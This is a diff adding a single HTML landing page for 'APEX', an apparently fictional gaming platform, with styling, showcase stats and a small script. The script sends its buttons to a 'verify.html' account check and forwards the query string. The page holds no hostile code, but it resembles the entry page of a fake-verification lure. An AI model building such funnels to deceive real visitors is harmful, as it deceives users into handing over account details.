@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>APEX — Level up your game</title>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;500;600;700&family=Saira:wght@400;500;600;700;900&display=swap" rel="stylesheet">
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;}
+  :root{--bg:#0a0a0f;--panel:#12121a;--line:#1e1e2a;--txt:#e8e8f0;--txt-dim:#7a7a8a;--txt-mute:#4a4a5a;--red:#ff2233;--red-glow:rgba(255,34,51,0.4);--yellow:#ffe600;}
+  html,body{height:100%;}
+  body{font-family:'Saira',sans-serif;background:var(--bg);color:var(--txt);min-height:100vh;display:flex;flex-direction:column;letter-spacing:-0.005em;position:relative;}
+
+  body::before{
+    content:"";position:fixed;inset:0;pointer-events:none;z-index:0;
+    background:
+      radial-gradient(900px 500px at 80% -10%,rgba(255,34,51,0.1),transparent 60%),
+      radial-gradient(700px 500px at 0% 100%,rgba(102,51,255,0.08),transparent 60%);
+  }
+
+  .nav{position:relative;z-index:5;padding:20px 44px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--line);background:rgba(10,10,15,0.8);backdrop-filter:blur(12px);}
+  .brand{display:flex;align-items:center;gap:12px;font-family:'Chakra Petch',sans-serif;font-size:24px;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;}
+  .brand-mark{width:36px;height:36px;border-radius:9px;background:var(--red);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:900;font-size:18px;box-shadow:0 0 20px var(--red-glow);}
+  .brand .glow{color:var(--red);text-shadow:0 0 12px var(--red);}
+  .nav-links{display:flex;gap:34px;font-size:13.5px;font-weight:500;letter-spacing:0.05em;text-transform:uppercase;color:var(--txt-dim);}
+  .nav-links a{color:inherit;text-decoration:none;transition:color .2s;}
+  .nav-links a:hover{color:var(--red);}
+  .nav-cta{padding:11px 22px;font-family:'Chakra Petch',sans-serif;font-size:13px;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;color:#fff;background:var(--red);border:none;border-radius:8px;text-decoration:none;cursor:pointer;box-shadow:0 6px 20px var(--red-glow);transition:all .22s;position:relative;}
+  .nav-cta:hover{transform:translateY(-1px);box-shadow:0 10px 28px var(--red-glow);}
+
+  .hero{position:relative;z-index:2;flex:1;max-width:1280px;width:100%;margin:0 auto;padding:64px 44px 60px;display:grid;grid-template-columns:1.1fr 0.9fr;gap:70px;align-items:center;}
+
+  .eyebrow{display:inline-flex;align-items:center;gap:9px;font-family:'Chakra Petch',sans-serif;font-size:12px;font-weight:600;letter-spacing:0.2em;text-transform:uppercase;color:var(--red);padding:7px 14px;background:rgba(255,34,51,0.08);border:1px solid rgba(255,34,51,0.25);border-radius:6px;margin-bottom:28px;}
+  .eyebrow::before{content:"";width:6px;height:6px;border-radius:50%;background:var(--red);box-shadow:0 0 8px var(--red);animation:pulse 1.4s infinite;}
+  @keyframes pulse{0%,100%{opacity:1;}50%{opacity:.35;}}
+
+  h1{font-family:'Chakra Petch',sans-serif;font-size:74px;font-weight:700;line-height:0.95;letter-spacing:-0.02em;text-transform:uppercase;color:#fff;margin-bottom:26px;text-shadow:0 0 30px rgba(255,34,51,0.3);}
+  h1 .red{color:var(--red);text-shadow:0 0 30px var(--red);}
+  h1 .block{display:inline-block;padding:0 12px;background:var(--red);color:#fff;}
+
+  .lead{font-size:16.5px;line-height:1.7;color:var(--txt-dim);max-width:520px;margin-bottom:38px;font-weight:400;}
+
+  .actions{display:flex;gap:14px;flex-wrap:wrap;}
+
+  .btn-primary{display:inline-flex;align-items:center;gap:12px;padding:17px 32px;font-family:'Chakra Petch',sans-serif;font-size:14px;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;color:#fff;background:var(--red);border:none;border-radius:10px;text-decoration:none;cursor:pointer;box-shadow:0 10px 30px var(--red-glow);transition:all .22s;position:relative;overflow:hidden;}
+  .btn-primary::before{content:"";position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.3),transparent);transition:left .6s;}
+  .btn-primary:hover::before{left:100%;}
+  .btn-primary:hover{transform:translateY(-2px);box-shadow:0 14px 38px var(--red-glow);}
+  .btn-primary .arrow{transition:transform .22s;}
+  .btn-primary:hover .arrow{transform:translateX(4px);}
+
+  .btn-ghost{display:inline-flex;align-items:center;gap:10px;padding:17px 26px;font-family:'Chakra Petch',sans-serif;font-size:14px;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;color:var(--txt);background:transparent;border:1.5px solid var(--line);border-radius:10px;text-decoration:none;transition:all .2s;}
+  .btn-ghost:hover{border-color:var(--red);color:var(--red);box-shadow:0 0 24px rgba(255,34,51,0.15);}
+
+  .stats{display:grid;grid-template-columns:repeat(3,1fr);gap:36px;margin-top:60px;padding-top:32px;border-top:1px solid var(--line);}
+  .stat .num{font-family:'Chakra Petch',sans-serif;font-size:44px;font-weight:700;letter-spacing:-0.02em;line-height:1;color:#fff;}
+  .stat .num .red{color:var(--red);}
+  .stat .lbl{font-size:12.5px;color:var(--txt-mute);margin-top:8px;text-transform:uppercase;letter-spacing:0.12em;font-weight:500;}
+
+  .visual{position:relative;min-height:560px;display:flex;align-items:center;justify-content:center;}
+
+  .game-card{width:100%;max-width:420px;background:var(--panel);border:1px solid var(--line);border-radius:20px;overflow:hidden;position:relative;}
+  .game-card::before{
+    content:"";position:absolute;top:0;left:0;right:0;height:3px;
+    background:linear-gradient(90deg,transparent,var(--red),transparent);
+    box-shadow:0 0 20px var(--red);
+  }
+  .game-preview{
+    height:220px;
+    background:
+      radial-gradient(circle at 60% 40%, rgba(255,34,51,0.3), transparent 60%),
+      linear-gradient(135deg,#1a0a0f 0%,#0a0a0f 100%);
+    position:relative;display:flex;align-items:center;justify-content:center;overflow:hidden;
+  }
+  .game-preview::before{
+    content:"";position:absolute;inset:0;
+    background-image:
+      linear-gradient(rgba(255,34,51,0.08) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,34,51,0.08) 1px, transparent 1px);
+    background-size:24px 24px;
+    mask-image:radial-gradient(ellipse at 50% 50%, black 30%, transparent 80%);
+    -webkit-mask-image:radial-gradient(ellipse at 50% 50%, black 30%, transparent 80%);
+  }
+  .game-icon{font-size:88px;filter:drop-shadow(0 0 30px var(--red));z-index:1;}
+
+  .live-badge{position:absolute;top:16px;left:16px;padding:6px 12px;background:var(--red);color:#fff;font-family:'Chakra Petch',sans-serif;font-size:11px;font-weight:700;letter-spacing:0.15em;text-transform:uppercase;border-radius:6px;display:flex;align-items:center;gap:6px;}
+  .live-badge::before{content:"";width:6px;height:6px;border-radius:50%;background:#fff;animation:blink 1s infinite;}
+  @keyframes blink{0%,100%{opacity:1;}50%{opacity:.3;}}
+
+  .game-body{padding:24px 26px 26px;}
+  .game-title{font-family:'Chakra Petch',sans-serif;font-size:22px;font-weight:700;letter-spacing:-0.01em;text-transform:uppercase;margin-bottom:8px;}
+  .game-meta{font-size:13px;color:var(--txt-mute);margin-bottom:20px;letter-spacing:0.03em;}
+
+  .player-row{display:flex;align-items:center;gap:14px;padding:14px 0;border-top:1px solid var(--line);}
+  .player-av{width:42px;height:42px;border-radius:10px;background:linear-gradient(135deg,#ff2233,#a00a1a);display:flex;align-items:center;justify-content:center;color:#fff;font-family:'Chakra Petch',sans-serif;font-weight:700;font-size:15px;}
+  .player-info{flex:1;}
+  .player-info .n{font-size:13.5px;font-weight:600;color:var(--txt);}
+  .player-info .l{font-size:11.5px;color:var(--txt-mute);margin-top:2px;letter-spacing:0.03em;}
+  .player-score{font-family:'Chakra Petch',sans-serif;font-size:16px;font-weight:700;color:var(--yellow);}
+
+  .float-badge{position:absolute;top:16%;right:-16px;background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:12px 16px;box-shadow:0 12px 32px rgba(0,0,0,0.5);display:flex;align-items:center;gap:10px;animation:float 4s ease-in-out infinite;}
+  .float-badge .ic{width:32px;height:32px;border-radius:8px;background:var(--red);display:flex;align-items:center;justify-content:center;color:#fff;font-size:15px;}
+  .float-badge .txt .k{font-size:10.5px;color:var(--txt-mute);text-transform:uppercase;letter-spacing:0.1em;font-weight:600;}
+  .float-badge .txt .v{font-family:'Chakra Petch',sans-serif;font-size:14px;font-weight:700;color:var(--red);margin-top:2px;}
+  @keyframes float{0%,100%{transform:translateY(0);}50%{transform:translateY(-8px);}}
+
+  .footer{position:relative;z-index:2;padding:22px 44px;border-top:1px solid var(--line);display:flex;justify-content:space-between;align-items:center;font-size:12.5px;color:var(--txt-mute);letter-spacing:0.05em;text-transform:uppercase;flex-wrap:wrap;gap:12px;}
+  .footer a{color:inherit;text-decoration:none;margin-left:22px;}
+  .footer a:hover{color:var(--red);}
+
+  @media (max-width:900px){
+    .hero{grid-template-columns:1fr;padding:40px 22px;gap:44px;}
+    h1{font-size:48px;}
+    .nav{padding:16px 22px;}
+    .nav-links{display:none;}
+    .stats{grid-template-columns:1fr;gap:20px;}
+    .float-badge{right:0;}
+    .footer{padding:18px 22px;}
+  }
+</style>
+</head>
+<body>
+
+<nav class="nav">
+  <div class="brand"><div class="brand-mark">A</div>APEX<span class="glow">.</span></div>
+  <div class="nav-links"><a href="#">Games</a><a href="#">Leaderboard</a><a href="#">Store</a></div>
+  <a class="nav-cta" href="verify.html" id="navBtn">Play now</a>
+</nav>
+
+<main class="hero">
+
+  <section>
+    <div class="eyebrow">Season 12 · Live</div>
+    <h1>Level up<br>your <span class="red">game</span><br>with <span class="block">APEX</span></h1>
+    <p class="lead">
+      Join millions of players in the world's fastest growing gaming
+      platform. One quick check to verify your account, then you're in.
+    </p>
+    <div class="actions">
+      <a class="btn-primary" href="verify.html" id="ctaBtn">
+        Enter the arena <span class="arrow">→</span>
+      </a>
+      <a class="btn-ghost" href="#">Watch trailer</a>
+    </div>
+
+    <div class="stats">
+      <div class="stat"><div class="num">48<span class="red">M</span></div><div class="lbl">Active players</div></div>
+      <div class="stat"><div class="num">1.2<span class="red">K</span></div><div class="lbl">Tournaments</div></div>
+      <div class="stat"><div class="num">$8.4<span class="red">M</span></div><div class="lbl">Prize pool</div></div>
+    </div>
+  </section>
+
+  <section class="visual">
+    <div class="float-badge">
+      <div class="ic">🔥</div>
+      <div class="txt">
+        <div class="k">Win streak</div>
+        <div class="v">12 games</div>
+      </div>
+    </div>
+
+    <div class="game-card">
+      <div class="game-preview">
+        <div class="live-badge">Live match</div>
+        <div class="game-icon">🎮</div>
+      </div>
+      <div class="game-body">
+        <div class="game-title">Crimson Arena</div>
+        <div class="game-meta">Ranked · 5v5 · SEA server</div>
+
+        <div class="player-row">
+          <div class="player-av">K</div>
+          <div class="player-info">
+            <div class="n">KAIDO_X</div>
+            <div class="l">Diamond I · 78% WR</div>
+          </div>
+          <div class="player-score">2840</div>
+        </div>
+        <div class="player-row">
+          <div class="player-av" style="background:linear-gradient(135deg,#6633ff,#3311aa);">V</div>
+          <div class="player-info">
+            <div class="n">V0RTEX</div>
+            <div class="l">Platinum III · 64% WR</div>
+          </div>
+          <div class="player-score">2510</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="footer">
+  <span>© 2026 Apex Interactive · All rights reserved</span>
+  <span><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Support</a></span>
+</footer>
+
+<script>
+  document.getElementById("ctaBtn").addEventListener("click", function(e){e.preventDefault();location.href="verify.html"+location.search;});
+  document.getElementById("navBtn").addEventListener("click", function(e){e.preventDefault();location.href="verify.html"+location.search;});
+</script>
+
+</body>
+</html>
